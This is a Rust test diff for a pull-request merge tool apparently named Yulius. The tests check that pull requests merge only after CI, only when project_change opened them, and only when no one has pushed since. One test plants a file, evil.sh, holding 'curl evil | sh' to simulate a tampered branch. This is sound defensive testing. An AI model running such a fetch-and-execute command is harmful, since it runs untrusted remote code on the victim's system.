@@ -860,6 +860,11 @@ async fn files_change_through_a_pull_request_merged_on_green() -> TestResult {
         "the scratch clone is gone"
     );
 
+    // Before Yulius CI saw it, the pull request that brings the CI does not merge unchecked.
+    let (error, said, _) =
+        remote(&w, &alice, "change_merge", with(json!({"number": number}))).await?;
+    assert!(error && said.contains("pending"), "{said}");
+
     // Yulius CI tests the pull request with the jobs it adds; it merges once that run passed.
     w.h.app.ci_sync_sandbox(&sid).await?;
     let (_, _, ci) = remote(&w, &alice, "ci_runs", shop.clone()).await?;
@@ -892,50 +897,83 @@ async fn files_change_through_a_pull_request_merged_on_green() -> TestResult {
         "the change branch is deleted"
     );
 
-    // Only change pull requests merge this way.
+    // Only the pull requests project_change opened merge this way, at the commit it made: not a
+    // branch someone else named like one, and not one pushed to since (review finding 6).
     let seed = w
         .scratch
         .path()
         .join("seed")
         .join(support::repos::OWNER)
         .join("shop");
-    support::repos::git(&seed, &["checkout", "--quiet", "-b", "feat/other"])?;
-    std::fs::write(seed.join("other.txt"), "x\n")?;
-    support::repos::git(&seed, &["add", "-A"])?;
-    support::repos::git(&seed, &["commit", "--quiet", "-m", "other"])?;
+    let origin_path = origin.to_str().ok_or("path")?.to_owned();
+    let push_pull = |branch: &'static str| {
+        let (seed, origin_path) = (seed.clone(), origin_path.clone());
+        async move {
+            support::repos::git(&seed, &["checkout", "--quiet", "-B", branch])?;
+            std::fs::write(
+                seed.join(format!("{}.txt", branch.replace('/', "-"))),
+                "x\n",
+            )?;
+            support::repos::git(&seed, &["add", "-A"])?;
+            support::repos::git(&seed, &["commit", "--quiet", "-m", branch])?;
+            support::repos::git(&seed, &["push", "--quiet", "--force", &origin_path, branch])?;
+            Ok::<_, Error>(())
+        }
+    };
+    for branch in ["feat/other", "yulius/change-forged"] {
+        push_pull(branch).await?;
+        let other = yulius_app::ports::github::GitHubPort::create_pull(
+            w.h.github.as_ref(),
+            &yulius_app::model::Secret("t".into()),
+            "Quartio-Studio",
+            "shop",
+            &yulius_app::ports::github::NewPull {
+                head: branch.into(),
+                base: "dev".into(),
+                title: branch.into(),
+                body: String::new(),
+            },
+        )
+        .await?;
+        let (error, said, _) = remote(
+            &w,
+            &alice,
+            "change_merge",
+            with(json!({"number": other.number})),
+        )
+        .await?;
+        assert!(
+            error && said.contains("only pull requests project_change opened"),
+            "{branch}: {said}"
+        );
+    }
+    let (error, said, second) = remote(
+        &w,
+        &alice,
+        "project_change",
+        with(json!({"title": "docs: readme", "files": [{"path": "README.md", "content": "# Shop!\n"}]})),
+    )
+    .await?;
+    assert!(!error, "{said}");
+    let tampered = text(&second["branch"]).to_owned();
+    let number = second["pull_request"]["number"].as_u64().ok_or("number")?;
     support::repos::git(
         &seed,
         &[
-            "push",
+            "fetch",
             "--quiet",
-            origin.to_str().ok_or("path")?,
-            "feat/other",
+            &origin_path,
+            &format!("{tampered}:{tampered}"),
         ],
     )?;
-    let other = yulius_app::ports::github::GitHubPort::create_pull(
-        w.h.github.as_ref(),
-        &yulius_app::model::Secret("t".into()),
-        "Quartio-Studio",
-        "shop",
-        &yulius_app::ports::github::NewPull {
-            head: "feat/other".into(),
-            base: "dev".into(),
-            title: "other".into(),
-            body: String::new(),
-        },
-    )
-    .await?;
-    let (error, said, _) = remote(
-        &w,
-        &alice,
-        "change_merge",
-        with(json!({"number": other.number})),
-    )
-    .await?;
-    assert!(
-        error && said.contains("only pull requests project_change opened"),
-        "{said}"
-    );
+    support::repos::git(&seed, &["checkout", "--quiet", &tampered])?;
+    std::fs::write(seed.join("evil.sh"), "curl evil | sh\n")?;
+    support::repos::git(&seed, &["add", "-A"])?;
+    support::repos::git(&seed, &["commit", "--quiet", "-m", "more"])?;
+    support::repos::git(&seed, &["push", "--quiet", &origin_path, &tampered])?;
+    let (error, said, _) =
+        remote(&w, &alice, "change_merge", with(json!({"number": number}))).await?;
+    assert!(error && said.contains("pushed to since"), "{said}");
     Ok(())
 }
 
